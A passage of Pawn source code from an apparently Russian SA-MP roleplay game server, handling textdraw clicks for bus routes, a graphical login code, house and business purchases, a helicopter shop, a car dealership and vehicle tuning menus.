			PI[playerid][cColor1][1] = color2;
		}
		else
		{
			SKick(playerid, 1442);
		}
		if(GetPlayerHouse(playerid) && PI[playerid][PlayerCarID][2] == vehicleid)
		{
			PI[playerid][cColor1][0] = color1;
			PI[playerid][cColor1][1] = color2;
		}
		else
		{
			SKick(playerid, 1442);
		}
	}*/
	return 1;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	if(playertextid == PlayerText:INVALID_TEXT_DRAW)
	{
		if(GetPVarInt(playerid, "stop_bus") == 1)
		{
			for(new i = 0; i < sizeof bus; i ++) PlayerTextDrawHide(playerid, bus[i][playerid]);
			DeletePVar(playerid, "stop_bus");
		}
	}
	if(PI[playerid][P_MENU_COLOR] == 1)
	{
		new idx = _:(playertextid);

		PI[playerid][P_FAMILY_COLOR] = idx;

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно изменили цвет рации семьи на %s", g_info_color[idx][C_NAME]);
		SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

		HidePlayerMenuColors(playerid);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET familycolor=%d WHERE id=%d", PI[playerid][P_FAMILY_COLOR], PI[playerid][pID]);
		mysql_tquery(dbHandle, STRING_GLOBAL);
	}
	if(PI[playerid][pBusID] != -1)
	{
		if(playertextid == bus[12][playerid])
		{
			SetPVarInt(playerid, "bus_route", 1);
		}
		if(playertextid == bus[13][playerid])
		{
			SetPVarInt(playerid, "bus_route", 2);
		}
		if(playertextid == bus[3][playerid])
		{
			SetPVarInt(playerid, "bus_route", 2);
		}
		if(playertextid == bus[6][playerid])
		{
			if(GetPVarInt(playerid, "bus_route") == 0)
				return SendClientMessage(playerid, C_RED, "Вы не выбрали маршрут");

			ShowPlayerDialogRoute(playerid);
		}

		if(playertextid == bus[7][playerid])
		{
			DeletePVar(playerid, "bus_route");
			DeletePVar(playerid, "stop_bus");
			for(new i = 0; i < sizeof bus; i ++) PlayerTextDrawHide(playerid, bus[i][playerid]);
			PI[playerid][pBusTimer] =
			PI[playerid][pBusID] = -1;
			CancelSelectTextDraw(playerid);
		}
	}
    for(new i = 0; i < 9; i++)
	{
		if(playertextid == SecurityCode[playerid][i])
		{
		    PlayerPlaySound(playerid, 17803, 0.0, 0.0, 0.0);
		    if(GetPVarInt(playerid, "NumberDigits") == 0) return PI[playerid][pInputCode] += 1000 * (mass_pass[playerid][i]), SetPVarInt(playerid, "NumberDigits", GetPVarInt(playerid, "NumberDigits") + 1);
		    else if(GetPVarInt(playerid, "NumberDigits") == 1) return PI[playerid][pInputCode] += 100 * (mass_pass[playerid][i]), SetPVarInt(playerid, "NumberDigits", GetPVarInt(playerid, "NumberDigits") + 1);
		    else if(GetPVarInt(playerid, "NumberDigits") == 2) return PI[playerid][pInputCode] += 10 * (mass_pass[playerid][i]), SetPVarInt(playerid, "NumberDigits", GetPVarInt(playerid, "NumberDigits") + 1);
		    else if(GetPVarInt(playerid, "NumberDigits") == 3)
			{
				PI[playerid][pInputCode] += 1 * (mass_pass[playerid][i]), SetPVarInt(playerid, "NumberDigits", 0);
				if(PI[playerid][pInputCode] == PI[playerid][pSecurityCode])
				{
				    if(PI[playerid][pAdmin] > ADM_NONE) SendClientMessage(playerid,COLOR_LIME,"Вы вошли как администратор. Для авторизации, введите {FFCC00}/alogin");
				    //if(!PI[playerid][pMailConfirmed] && PI[playerid][pLevel] < 3) SendClientMessage(playerid, COLOR_YELLOW, "Ваша почта не привязана. Привяжите её, чтобы потвердить Ваш аккаунт (/menu - Безопасность)");
				    PlayerLogged[playerid] = true;
					TogglePlayerSpectating(playerid, false);
   					SpawnPlayer(playerid);
				}
				else KickEx(playerid, "Incorrect graphcode"), SendClientMessage(playerid, C_BLUE, "Вы были кикнуты по причине ввода неверного графического пароля!");
				for(new f = 0; f < 10; f++) PlayerTextDrawHide(playerid,SecurityCode[playerid][f]);
				PI[playerid][pInputCode] = -1;
				Ujahhs[playerid] = 0;
				CancelSelectTextDraw(playerid);
			}
		}
	}
	if(playertextid == PlayerMenu[playerid][3] && PlayersMenu[playerid] > 0)//закрыть
	{
		PlayerMenuExit(playerid);
   	}
   	if(playertextid == PlayerMenu[playerid][5])//далее
	{
		switch(PlayersMenu[playerid])
		{
			case 4://Вход в бизнес
			{
				new idx = GetPVarInt(playerid, "PlayerBizz");
				if(GetMoney(playerid) < BizzInfo[idx][bEnter]) return SendClientMessage(playerid, C_RED, "Недостаточно средств для входа!");
				if(PI[playerid][pLevel] < 2 && BizzInfo[idx][bType] == 9) return SendClientMessage(playerid, C_RED, "Вход в казино возможен только со второго уровня.");
				SetTimerEx("PickupBack",3000,0,"i",playerid);
		        pickupentered[playerid] = 1;
				GiveMoney(playerid, -BizzInfo[idx][bEnter], "Вход в бизнес");
				BizzInfo[idx][bMoney] += BizzInfo[idx][bEnter];
				BizzPay[idx] += BizzInfo[idx][bEnter];
				MysqlUpdateBizzInt(idx, "money", BizzInfo[idx][bMoney]);
				FreezePlayer(playerid, 5000);
				SetPlayerPos(playerid, g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_X], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Y], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Z]);
				SetPlayerFacingAngle(playerid, g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_A]);
				SetPlayerInterior(playerid,BizzInfo[idx][bInt]);
				SetPlayerVirtualWorld(playerid,BizzInfo[idx][bVirtual]);
				SetCameraBehindPlayer(playerid);
				PlayerMenuExit(playerid);
			}
			case 5:
			{
				new idx = GetPVarInt(playerid, "PlayerHouse");
				if(!strcmp(HouseInfo[idx][hOwner], "None", true))
				{
					if(PI[playerid][pCash] < HouseInfo[idx][hPrice]) return SendMess(playerid, MSG_NOT_MONEY);
					else
					{
						new house = 0;
						for(new i = TOTALHOUSE; i > 0; i --)
						{
							if(!strcmp(HouseInfo[i][hOwner], GetName(playerid), true)) house++;
						}
						if(house != 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас уже есть дом!");
						GiveMoney(playerid, -HouseInfo[idx][hPrice], "Покупка дома");
						HouseInfo[idx][hBuyPrice] = HouseInfo[idx][hPrice]/2;
						HouseInfo[idx][hOplata] = 1;
						HouseInfo[idx][hLock] = 1;

	                    STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы купили дом за %iр. У Вас осталось: %iр",HouseInfo[idx][hPrice], PI[playerid][pCash]);
						SendClientMessage(playerid, COLOR_GREEN, STRING_GLOBAL);
						SendClientMessage(playerid, COLOR_YELLOW, "Ваш домашний счет проплачен на 1 день, рекомендуем вам оплатить дом");

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Стоимость кварплаты для вашего дома будет составлять %dр в сутки",GetHomeOplata(idx));
						SendClientMessage(playerid, COLOR_YELLOW, STRING_GLOBAL);
						strmid(HouseInfo[idx][hOwner], GetName(playerid), 0, strlen(GetName(playerid)), MAX_PLAYER_NAME);

						if(PI[playerid][P_FAMILY] != 0 && HouseInfo[idx][hDiscript] == 4)
						{
							SendClientMessage(playerid, C_OSNOV, "Вы можете установить этот дом как спавн в своей семье. Для этого воспользуйтесь: /family");

							new familyid = PI[playerid][P_FAMILY];

							SetFamilyData(familyid, F_STORE_LABEL, CreateDynamic3DTextLabel("Склад", 0xFFFF00FF, 498.0487,-2.2444,1904.9518+1.0, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, HouseInfo[idx][hVirtual], HouseInfo[idx][hInt]));
							UpdateHouseFamilyLabel(familyid);
						}

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET hOwner = '%s', hOplata = %i, buyprice = %i, hLock = %i WHERE id = '%d' LIMIT 1", HouseInfo[idx][hOwner], GetHomeOplata(idx)*2, HouseInfo[idx][hBuyPrice], HouseInfo[idx][hLock], idx);
						mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
						PI[playerid][pSpawnChange] = 1;
						MysqlUpdatePlayerInt(playerid, "spawnchange", PI[playerid][pSpawnChange]);
						//LoadMyCar(playerid);
						UpdateHouse(idx);
						PlayerMenuExit(playerid);
						return 1;
					}
				}
				else
				{
					if(HouseInfo[idx][hLock] == 1)
					{
						if(strcmp(GetName(playerid), HouseInfo[idx][hOwner], true) == 0) ShowPlayerDialog(playerid, D_JOB+14, 0, "Дом", "{FFFFFF}Ваш дом закрыт\n\nВы хотите его открыть?", "Да", "Нет");
						GameTextForPlayer(playerid, "~r~Locked", 5000, 1);
					}
					else
					{
	                    FreezePlayer(playerid, 5000);
						SetPlayerPos(playerid,HouseInfo[idx][hExitx],HouseInfo[idx][hExity],HouseInfo[idx][hExitz]);
						SetPlayerInterior(playerid,HouseInfo[idx][hInt]);
						SetPlayerVirtualWorld(playerid,HouseInfo[idx][hVirtual]);
					}
					PlayerMenuExit(playerid);
				}
			}
		}
   	}
	if(InShop[playerid] == 3)
	{
		if(playertextid == buy_copter[3][playerid])	// left
		{
			if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;
			pPressed[playerid]--;
			new fmt_text[64];
			DestroyVehicle(PI[playerid][SalonCarID]);
			PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;

			if(pPressed[playerid] < 0) pPressed[playerid] = sizeof(copter_cars)-1;

			PI[playerid][SalonCarID] = CreateVehicle(copter_cars[pPressed[playerid]][copID],2339.5859, -1780.8318, 33.201,-139.0800,PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1],10000);
			PlayerLastTick[playerid] = GetTickCount();
			//LinkVehicleToInterior(PI[playerid][SalonCarID],3);
			SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
			SetPlayerCameraPos(playerid, 2360.9397, -1781.4974, 38.2566);
			SetPlayerCameraLookAt(playerid, 2359.9360, -1781.4890, 38.0713);
			format(fmt_text, sizeof fmt_text, "СТОИМОСТЬ: ~y~%d РУБЛЕЙ", copter_cars[pPressed[playerid]][copCost]);
			PlayerTextDrawSetString(playerid, buy_copter[5][playerid], fmt_text);
		}
		else if(playertextid == buy_copter[4][playerid]) // right
		{
			if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;
			pPressed[playerid]++;
			new fmt_text[64];
			DestroyVehicle(PI[playerid][SalonCarID]);
			PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;
			if(pPressed[playerid] >= 3) pPressed[playerid] = 0;
			PI[playerid][SalonCarID] = CreateVehicle(copter_cars[pPressed[playerid]][copID],2339.5859, -1780.8318, 33.201,-139.0800,PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1],10000);
			PlayerLastTick[playerid] = GetTickCount();
			//LinkVehicleToInterior(PI[playerid][SalonCarID],3);
			SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
			SetPlayerCameraPos(playerid, 2360.9397, -1781.4974, 38.2566);
			SetPlayerCameraLookAt(playerid, 2359.9360, -1781.4890, 38.0713);
			format(fmt_text, sizeof fmt_text, "СТОИМОСТЬ: ~y~%d РУБЛЕЙ", copter_cars[pPressed[playerid]][copCost]);
			PlayerTextDrawSetString(playerid, buy_copter[5][playerid], fmt_text);
		}
		else if(playertextid == buy_copter[6][playerid]) // left color
		{
			if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;

			if(PI[playerid][P_COLOR][0] == 0)
				PI[playerid][P_COLOR][0] = 255;
			else
				PI[playerid][P_COLOR][0] -= 1;

			ChangeVehicleColor(PI[playerid][SalonCarID], PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1]);

			PlayerLastTick[playerid] = GetTickCount();
		}
		else if(playertextid == buy_copter[7][playerid]) // right color
		{
			if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;

			if(PI[playerid][P_COLOR][0] == 255)
				PI[playerid][P_COLOR][0] = 0;
			else
				PI[playerid][P_COLOR][0] += 1;

			ChangeVehicleColor(PI[playerid][SalonCarID], PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1]);

			PlayerLastTick[playerid] = GetTickCount();
		}
		else if(playertextid == buy_copter[9][playerid]) // buy
		{
			if(PI[playerid][pLevel] < 1)
				return SendClientMessage(playerid, C_RED, "Покупать вертолет можно с 7 уровня");

			if(PI[playerid][pCash] < copter_cars[pPressed[playerid]][copCost])
				return SendMess(playerid, MSG_NOT_MONEY);

			new rows;
			new fmt_query[260];
			new Cache: result;

			mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM copters WHERE owner_name='%e'", GetName(playerid));
			result = mysql_query(dbHandle, fmt_query);

			rows = cache_num_rows();

			if(rows)
				return SendClientMessage(playerid, C_RED, "У Вас есть личный вертолет"), cache_delete(result);

			GiveMoney(playerid, -copter_cars[pPressed[playerid]][copCost], "Покупка вертолета");

			SendClientMessage(playerid, COLOR_RED, "Вы успешно приобрели вертолет.");
			SendClientMessage(playerid, COLOR_RED, "Загрузить его можно с помощью команды: /fixcopter");

			for(new i; i < 13; i++) PlayerTextDrawHide(playerid, buy_copter[i][playerid]);
			CancelSelectTextDraw(playerid);
			InShop[playerid] = 0;
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerPos(playerid, 675.6013, 620.3592, 12.0234);
			TogglePlayerControllable(playerid, 1);
			CancelSelectTextDraw(playerid);
			SetCameraBehindPlayer(playerid);

			new idx = random(10);

			mysql_format(dbHandle, fmt_query, sizeof fmt_query, "INSERT INTO copters (owner_name, copter_id, copter_color1, copter_color2, pos_x, pos_y, pos_z, pos_r) VALUES ('%e', '%d', '%d', '%d', '%f', '%f', '%f', '0.0')", GetName(playerid), copter_cars[pPressed[playerid]][copID], PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], coord_copter_spawn[idx][0], coord_copter_spawn[idx][1], coord_copter_spawn[idx][2]);
			mysql_query(dbHandle, fmt_query);

			DestroyVehicle(PI[playerid][SalonCarID]);
			PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;

			pPressed[playerid] = 0;
		}
		else if(playertextid == buy_copter[10][playerid]) // cancel
		{
			for(new i; i < 13; i++) PlayerTextDrawHide(playerid, buy_copter[i][playerid]);
			CancelSelectTextDraw(playerid);
			InShop[playerid] = 0;
			pPressed[playerid] = 0;
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerPos(playerid, -44.1234,922.3990,12.0000);
			SetPlayerFacingAngle(playerid, 180.0);
			TogglePlayerControllable(playerid, 1);
			CancelSelectTextDraw(playerid);
			SetCameraBehindPlayer(playerid);
			DestroyVehicle(PI[playerid][SalonCarID]);
		}
	}
	return 1;
}

public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
    new newslot;
    if(clickedid == Text:INVALID_TEXT_DRAW)
    {
		if(PI[playerid][P_MENU_COLOR] == 1)
		{
			HidePlayerMenuColors(playerid);
		}
		else if(GetPVarInt(playerid, "send_promo") == 1)
		{
			for(new i; i < sizeof TDEditor_PROMO; i ++) TextDrawHideForPlayer(playerid, TDEditor_PROMO[i]);

			CancelSelectTextDraw(playerid);

			DeletePVar(playerid, "send_promo");
		}
		else if(GetPVarInt(playerid, "show_lic") == 1)
		{
			for(new i; i < sizeof TDEditor_LICGLOBAL; i ++) TextDrawHideForPlayer(playerid, TDEditor_LICGLOBAL[i]);
			PlayerTextDrawHide(playerid, TDEditor_LICPLAYER[playerid]);

			CancelSelectTextDraw(playerid);

			DeletePVar(playerid, "show_lic");
		}
		else if(PI[playerid][P_TUNING_TYPE] != -1)
		{
			if(!GetPVarInt(playerid, "UsedCTO")) return 0;
			new bizzid = GetPVarInt(playerid,"CTObizzid");
			if(GetPlayerState(playerid) != 2) return SKick(playerid, 12221);
			new pveh = GetPlayerVehicleID(playerid);
			SetVehiclePos(pveh,BizzInfo[bizzid][bEntrx],BizzInfo[bizzid][bEntry],BizzInfo[bizzid][bEntrz]);
			SetVehicleZAngle(pveh, g_vehicle[pveh][veh_a]);
			SetVehicleHealth(pveh, 1000.0);
			DeletePVar(playerid,"UsedCTO");
			SetPVarInt(playerid, "AntiBreik", 3);
			SetVehicleZAngle(pveh, 90.0);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			SetVehicleVirtualWorld(pveh,0);
			LinkVehicleToInterior(pveh,0);
			PutPlayerInVehicle(playerid, pveh, 0);
			TogglePlayerControllable(playerid,true);
			SetCameraBehindPlayer(playerid);

    		for(new i = 0; i < sizeof sto_td_player; i ++) PlayerTextDrawHide(playerid, sto_td_player[i][playerid]);
			for(new i; i < sizeof sto_td_global; i ++) TextDrawHideForPlayer(playerid, sto_td_global[i]);

    		CancelSelectTextDraw(playerid);

			PI[playerid][P_TUNING_TYPE] = -1;
		}
		else if(PI[playerid][SalonCarID] != INVALID_VEHICLE_ID)
		{
			if(1 <= InShop[playerid] <= 2)
			{
				BuyCloseCar(playerid);
			}
		}
    }
   	if(clickedid == select_skin[2])
	{
		PI[playerid][pModel] = ChosenSkin[playerid];
		ChosenSkin[playerid] = 0;
		SelectCharPlace[playerid] = 0;
		ClothesRound[playerid] = 0;
		TogglePlayerControllable(playerid, 1);
		CreateAccount(playerid, PI[playerid][pPassword]);
		for(new i; i < 4; i++) TextDrawHideForPlayer(playerid, select_skin[i]);
		CancelSelectTextDraw(playerid);
	}
	if(clickedid == autosalon_td[3])
	{
		BuyCar(playerid);
	}

	if(clickedid == autosalon_td[4])
	{
		BuyCloseCar(playerid);
	}

	if(clickedid == autosalon_td[1])
	{
		if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;

		new salon = PI[playerid][P_SALON];

		if(salon == 0)
		{
			if(pPressed[playerid] == 0)
				pPressed[playerid] = 37;
			else
				pPressed[playerid] -- ;
		}
		else if(salon == 1)
		{
			if(pPressed[playerid] == 0)
				pPressed[playerid] = 28;
			else
				pPressed[playerid] -- ;
		}
		else if(salon == 2)
		{
			if(pPressed[playerid] == 0)
				pPressed[playerid] = 16;
			else
				pPressed[playerid] -- ;
		}

		new idx = pPressed[playerid];

		DestroyVehicle(PI[playerid][SalonCarID]);
		PI[playerid][SalonCarID] = CreateVehicle(car_market_data[salon][idx][0],  648.3561,83.0103,20.1347,312.0086, PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], 10000);
		LinkVehicleToInterior(PI[playerid][SalonCarID],3);
		SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
		PutPlayerInVehicle(playerid,PI[playerid][SalonCarID],0);

		SetPlayerCameraPos(playerid, 655.419677, 84.478637, 21.507215);
		SetPlayerCameraLookAt(playerid, 650.651428, 83.572616, 20.306032);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s", g_vehicle_info[car_market_data[salon][idx][0]-400][VI_NAME]);
		PlayerTextDrawSetString(playerid, autosalon_ptd_first[playerid], STRING_GLOBAL);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%d_Р", g_vehicle_info[car_market_data[salon][idx][0]-400][VI_COST]);
		PlayerTextDrawSetString(playerid, autosalon_ptd_second[playerid], STRING_GLOBAL);

		PlayerLastTick[playerid] = GetTickCount();
	}
	if(clickedid == autosalon_td[2])
	{
		if((GetTickCount() - PlayerLastTick[playerid]) < 1000) return 1;

		new salon = PI[playerid][P_SALON];

		if(salon == 0)
		{
			if(pPressed[playerid] == 37)
				pPressed[playerid] = 0;
			else
				pPressed[playerid] ++;
		}
		else if(salon == 1)
		{
			if(pPressed[playerid] == 28)
				pPressed[playerid] = 0;
			else
				pPressed[playerid] ++;
		}
		else if(salon == 2)
		{
			if(pPressed[playerid] == 16)
				pPressed[playerid] = 0;
			else
				pPressed[playerid] ++;
		}

		new idx = pPressed[playerid];

		DestroyVehicle(PI[playerid][SalonCarID]);
		PI[playerid][SalonCarID] = CreateVehicle(car_market_data[salon][idx][0],  648.3561,83.0103,20.1347,312.0086, PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], 10000);

		LinkVehicleToInterior(PI[playerid][SalonCarID],3);
		SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
		PutPlayerInVehicle(playerid,PI[playerid][SalonCarID],0);

		SetPlayerCameraPos(playerid, 655.419677, 84.478637, 21.507215);
		SetPlayerCameraLookAt(playerid, 650.651428, 83.572616, 20.306032);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s", g_vehicle_info[car_market_data[salon][idx][0]-400][VI_NAME]);
		PlayerTextDrawSetString(playerid, autosalon_ptd_first[playerid], STRING_GLOBAL);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%d_Р", g_vehicle_info[car_market_data[salon][idx][0]-400][VI_COST]);
		PlayerTextDrawSetString(playerid, autosalon_ptd_second[playerid], STRING_GLOBAL);

		PlayerLastTick[playerid] = GetTickCount();
	}
	if(PI[playerid][P_TUNING_TYPE] != -1)
	{
		if(clickedid == sto_td_global[6])
		{
			PI[playerid][P_TUNING_TYPE] = 1;

			PlayerTextDrawSetString(playerid, sto_td_player[0][playerid], "‰BEЏ");

			PlayerTextDrawSetString
			(
				playerid,
				sto_td_player[1][playerid],
				"…CЊO‡’€Y• “‡E–EмЏ‘ …мЏEPЃE†CA,~n~B‘ЂEP…ЏE ЊPEѓЊOЌ…ЏAE–‘† ‰BEЏ~n~ѓ‡• ‡…ЌмO‚O ABЏO–OЂ…‡•."
			);


			new biz_id = GetPVarInt(playerid, "CTObizzid"),
			price = BizzInfo[biz_id][bTill]*5;

			STRING_GLOBAL[0] = EOS;
			format
			(
				STRING_GLOBAL, sizeof STRING_GLOBAL,
				"OCмOBмO† ‰BEЏ: %d~n~ѓOЊ.‰BEЏ: %d~n~K OЈћAЏE: %d PYЂ‡E†.", PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], price
			);
			PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);

			for(new idx; idx < 4; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);
			for(new idx = 2; idx < 4; idx ++) TextDrawShowForPlayer(playerid, sto_td_global[idx]);

			//TextDrawHideForPlayer(playerid, sto_td_global[0]);
			//TextDrawHideForPlayer(playerid, sto_td_global[1]);

			// основной_цвет:_24~n~доп.цвет:_52~n~К_ОПЛАТЕ:_200_руб.
			//ShowPlayerTuningColor(playerid);
		}
		if(clickedid == sto_td_global[9])
		{
			PI[playerid][P_TUNING_TYPE] = 2;

			PlayerTextDrawSetString(playerid, sto_td_player[0][playerid], "‚…ѓPAB‡…KA");

			new biz_id = GetPVarInt(playerid, "CTObizzid"),
			price = BizzInfo[biz_id][bTill]*100;

			STRING_GLOBAL[0] = EOS;
			format
			(
				STRING_GLOBAL, sizeof STRING_GLOBAL,
				"K OЊ‡AЏE: %d PYЂ‡E†.", price
			);
			PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);

			PlayerTextDrawSetString
			(
				playerid,
				sto_td_player[1][playerid],
				"B‘ ѓE†CЏB…ЏE‡’мO XOЏ…ЏE~n~YCЏAмOB…Џ’ ‚…ѓPAB‡…KY~n~мA CBO† ЏPAмCЊOPЏ?"
			);

			for(new idx; idx < 4; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);

			//ShowPlayerTuningButton(playerid);
		}
		if(clickedid == sto_td_global[12])
		{
			PI[playerid][P_TUNING_TYPE] = 3;

			PlayerTextDrawSetString(playerid, sto_td_player[0][playerid], "м…ЏPO");

			PlayerTextDrawSetString
			(
				playerid,
				sto_td_player[1][playerid],
				"B‘ЂEP…ЏE м…ЏPO ѓ‡•~n~BAЋE‚O ЏPAмCЊOPЏA,~n~…CЊO‡’€Y• CЏPE‡K…"
			);

			new nitro_amount[3] = {2, 5, 10};

			new tun_state = PI[playerid][P_TUNING_STATE];

			new bizzid = GetPVarInt(playerid,"CTObizzid");
			new till = BizzInfo[bizzid][bTill];

			new price;

			switch(tun_state)
			{
				case 1: price = till*80;
				case 2: price = till*150;
				case 3: price = till*300;
			}

			STRING_GLOBAL[0] = EOS;
			format
			(
				STRING_GLOBAL, sizeof STRING_GLOBAL,
				"ЂA‡Oм м…ЏPO: %d~N~OЂђE–: %d л~n~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, nitro_amount[tun_state-1], price
			);
			PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);

			for(new idx; idx < 4; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);
			for(new idx; idx < 2; idx ++) TextDrawShowForPlayer(playerid, sto_td_global[idx]);

			//ShowPlayerTuningSelect(playerid);
		}
		if(clickedid == sto_td_global[15])
		{
			PI[playerid][P_TUNING_STATE] = 1;
			AddVehicleComponent(GetPlayerVehicleID(playerid), g_tuning_disks[0][D_COMPONENT]);

			PI[playerid][P_TUNING_TYPE] = 4;

			PlayerTextDrawSetString(playerid, sto_td_player[0][playerid], "ѓ…CK…");

			PlayerTextDrawSetString
			(
				playerid,
				sto_td_player[1][playerid],
				"B‘ЂEP…ЏE ѓ…CK… ѓ‡•~n~BAЋE‚O ЏPAмCЊOPЏA,~n~…CЊO‡’€Y• CЏPE‡K…"
			);

			new tun_state = PI[playerid][P_TUNING_STATE];

			new bizzid = GetPVarInt(playerid,"CTObizzid");
			new till = BizzInfo[bizzid][bTill];

			AddVehicleComponent(GetPlayerVehicleID(playerid), g_tuning_disks[tun_state-1][D_COMPONENT]);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "ѓ…CK…: %d~N~мA€BAм…E: %s~n~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, g_tuning_disks[tun_state-1][D_NAME], till*g_tuning_disks[tun_state-1][D_PRICE]);
			PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);

			for(new idx; idx < 4; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);
			for(new idx; idx < 2; idx ++) TextDrawShowForPlayer(playerid, sto_td_global[idx]);

			//ShowPlayerTuningSelect(playerid);
		}
		if(clickedid == sto_td_global[18])
		{
			PI[playerid][P_TUNING_TYPE] = 5;

			PlayerTextDrawSetString(playerid, sto_td_player[0][playerid], "B…м…‡‘");

			PlayerTextDrawSetString
			(
				playerid,
				sto_td_player[1][playerid],
				"B‘ЂEP…ЏE B…м…‡‘ ѓ‡•~n~BAЋE‚O ЏPAмCЊOPЏA,~n~…CЊO‡’€Y• CЏPE‡K…"
			);

			new tun_state = PI[playerid][P_TUNING_STATE];

			new bizzid = GetPVarInt(playerid,"CTObizzid");
			new till = BizzInfo[bizzid][bTill];

			new price_paintjob[3] = {30, 35, 40};

			ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), tun_state-1);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "B…м…‡‘:_%d~N~CЏO…–OCЏ’: %d PYЂ‡E†", tun_state, till*price_paintjob[tun_state-1]);
			PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);

			for(new idx; idx < 4; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);
			for(new idx; idx < 2; idx ++) TextDrawShowForPlayer(playerid, sto_td_global[idx]);

			//ShowPlayerTuningSelect(playerid);
		}
		if(clickedid == sto_td_global[21])
		{
			PI[playerid][P_TUNING_TYPE] = 6;

			PlayerTextDrawSetString(playerid, sto_td_player[0][playerid], "PE–OмЏ");

			PlayerTextDrawSetString
			(
				playerid,
				sto_td_player[1][playerid],
				"B‘ ѓE†CЏB…ЏE‡’мO XOЏ…ЏE~n~OЏPE–OмЏ…POBAЏ’,~n~CBO† ЏPAмCЊOPЏ?"
			);

			PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], "CЏO…–OCЏ’: 1000 PYЂ‡E†");

			for(new idx; idx < 4; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);

			//ShowPlayerTuningButton(playerid);
		}
		if(clickedid == sto_td_global[24])
		{
			PI[playerid][P_TUNING_TYPE] = 7;

			PlayerTextDrawSetString(playerid, sto_td_player[0][playerid], "Y‡YЌЋ. ѓB…‚.");

			PlayerTextDrawSetString
			(
				playerid,
				sto_td_player[1][playerid],
				"B‘ЂEP…ЏE ѓB…‚AЏE‡’ ѓ‡•~n~BAЋE‚O ЏPAмCЊOPЏA,~n~…CЊO‡’€Y• CЏPE‡K…?"
			);

			new tun_state = PI[playerid][P_TUNING_STATE];

			PI[playerid][P_TUNING_STATE] = tun_state;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "ѓB…‚AЏE‡’:_%s~N~ЊP…ЂABKA K –AKC. CKOP.: %d K–/Ќ~n~CЏO…–OCЏ’: %d –‡м. PYЂ‡E†", g_tuning_engine[tun_state-1][E_NAME], g_tuning_engine[tun_state-1][E_MAX_SPEED], g_tuning_engine[tun_state-1][E_PRICE]);
			PlayerTextDrawSetString(playerid, sto_td_player[2][playerid], STRING_GLOBAL);

			for(new idx; idx < 4; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);
			for(new idx; idx < 2; idx ++) TextDrawShowForPlayer(playerid, sto_td_global[idx]);

			//ShowPlayerTuningSelect(playerid);
		}
		/* COMPLETE */


		if(PI[playerid][P_TUNING_TYPE] == 1)
		{
			if(clickedid == sto_td_global[2])
			{
